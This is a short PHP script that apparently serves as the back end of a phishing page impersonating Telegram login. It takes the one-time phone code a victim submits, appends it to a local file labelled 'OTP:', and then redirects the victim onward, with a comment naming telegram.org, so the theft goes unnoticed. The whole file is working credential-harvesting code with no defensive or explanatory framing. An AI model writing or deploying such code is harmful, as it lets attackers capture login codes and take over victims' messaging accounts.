<?php
file_put_contents("usernames.txt", "OTP: " . $_POST["phone_code"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://telegram.org
header("Location: $url");
exit();
?>